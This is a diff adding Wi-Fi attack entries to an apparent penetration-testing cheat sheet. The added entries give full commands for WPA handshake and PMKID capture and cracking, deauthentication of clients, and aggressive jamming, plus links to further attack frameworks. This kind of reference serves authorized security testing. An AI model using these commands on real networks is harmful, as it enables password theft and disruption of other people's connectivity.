@@ -282,6 +282,59 @@ wifite --cracked
 wifite --check capfile.pcap
 	check capfile for handshakes
 	
+WIFIBROOT
+	https://github.com/hash3liZer/WiFiBroot
+	--mode-based WPA/2(-PSK) attack tool; modes flag which attack to perform on target
+wifibroot.py --mode 2 -i wlan1mon --verbose -d /path/to/word.lst -w pmkid.txt
+Modes:
+    #     Name			Description                                 Value
+    01    HANDSHAKE		Capture 4-way handshake and crack MIC code    1
+    02    PMKID			Captures and Crack PMKID (PMKID Attack)       2
+    03    OFFLINE 		Perform Manual cracking on available
+          capture types. See --list-types               			  3
+    04    DEAUTH 		Deauthentication. Disconnect two stations and 
+						jam traffic.                          		  4
+wifibroot.py --mode 1 -i wlan1mon --verbose -d dicts/word,lst -w output.cap
+	--capture 4-way handshake & crack MIC code
+wifibroot.py --mode 2 -i wlan1mon --verbose -d dicts/list.txt -w output.txt
+	--capture && crack pkmid
+wifibroot.py --mode 3 --type handshake --essid "TARGET ESSID" --verbose -d ~/dict/word.lst --read output.cap
+	--crack handshake MIC offline
+wifibroot.py --mode 3 --type pmkid --verbose -d ~/dict/word.lst --read output.txt
+	--crack PKMID offline
+wifibroot.py --mode 4 -i wlan1mon -00 --verbose
+	---complete deauth attack
+wifibroot.py --mode 4 -i wlan1mon --ap [AP MAC] --verbose
+	--disconnect all clients from AP
+wifibroot.py --mode 4 -i wlan1mon --ap [AP MAC] --client [STA MAC] --verbose
+	--deauth target client
+
+wifi jammer
+	https://github.com/hash3liZer/wifijammer
+wifijammer.py --interface wlan1mon --channel 6 --aggressive
+
+
+airpydump
+	https://github.com/hash3liZer/airpydump
+airpydump.py -r [/path/to/.cap/file]
+	--reader mode
+airpydump.py -i [Monitor Interface] --live
+	--stealth mode
+airpydump.py -i [Monitor Interface] --live --curses
+	--live mode
+
+https://github.com/s0lst1c3/eaphammer
+
+sniffair framework
+	https://github.com/Tylous/SniffAir
+	--modular framework
+
+
+WiFi-Pumpkin
+	https://github.com/P0cL4bs/WiFi-Pumpkin
+	--best, most complete framework
+
+
 		
 TROUBLESHOOTING
 	--Are you physically close enough to send and receive AP packets. Remember that just because you can receive packets from the AP does not mean you will be able to transmit packets to the AP. The wireless card strength is typically less than the AP strength.
